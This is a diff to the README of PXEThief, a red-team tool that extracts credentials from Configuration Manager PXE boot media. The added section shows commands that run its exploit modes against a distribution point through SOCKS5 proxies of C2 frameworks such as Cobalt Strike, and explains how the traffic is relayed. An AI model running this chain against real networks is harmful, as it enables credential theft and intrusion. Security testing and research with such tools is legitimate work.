@@ -15,6 +15,7 @@ Based on the DEF CON 30 talk [Pulling Passwords out of Configuration Manager](ht
 - CMS envelope decryption with PKCS1v15, OAEP-SHA1, and OAEP-SHA256 key transport
 - Auto-converts extracted PFX certificates to PEM format for mTLS use
 - Detailed error output on every decryption path -- never silently fails
+- SOCKS5 proxy support -- full exploit chain through any C2 with SOCKS5 (UDP + TCP)
 
 ## Setup
 
@@ -66,6 +67,32 @@ python pxethief.py 3 <variables-file> <cracked-password>
 ```
 
 Omit the password to use the default MECM blank password.
+
+### SOCKS5 Proxy -- Exploit Through C2
+
+Run the full exploit chain through a SOCKS5 proxy (e.g. Cobalt Strike, Sliver, Mythic):
+
+```bash
+# Target a specific DP through a SOCKS5 proxy
+python pxethief.py 2 10.0.0.50 --proxy socks5://127.0.0.1:1080
+
+# With proxy authentication
+python pxethief.py 2 10.0.0.50 --proxy socks5://user:pass@127.0.0.1:1080
+
+# Decrypt a previously downloaded file + retrieve policies through proxy
+python pxethief.py 3 variables.var cracked-password --proxy socks5://127.0.0.1:1080
+```
+
+**How it works over SOCKS5:**
+- PXE boot exchange (UDP 4011) goes through SOCKS5 UDP ASSOCIATE
+- TFTP file download goes through SOCKS5 UDP relay
+- If TFTP fails (some C2s have limited UDP relay), falls back to SMB download from `REMINST` share (requires `impacket`: `pip install impacket`)
+- HTTP policy retrieval uses `socks5h://` (DNS resolved at proxy) through `requests`
+
+**Limitations:**
+- Mode 1 (DHCP broadcast discovery) cannot work over SOCKS5 -- use mode 2 with the DP IP
+- SOCKS5 server must support UDP ASSOCIATE for modes 1/2
+- Npcap/libpcap is NOT required when using `--proxy` (no raw sockets needed)
 
 ## Configuration
 
